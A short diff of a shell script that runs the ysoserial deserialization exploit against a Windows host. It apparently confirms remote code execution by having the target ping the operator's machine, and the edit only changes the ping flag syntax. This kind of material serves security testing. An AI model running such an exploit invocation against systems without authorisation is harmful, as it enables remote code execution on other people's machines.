@@ -69,8 +69,8 @@ echo
 # sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 
 print_info "Running ysoserial command for target Windows"
-print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"ping -n 4 ${LOCALIP}\""
-java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "ping -n 4 ${LOCALIP}"
+print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"ping /n 4 ${LOCALIP}\""
+java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "ping /n 4 ${LOCALIP}"
 
 print_info "Wait a little bit..."
 sleep 3
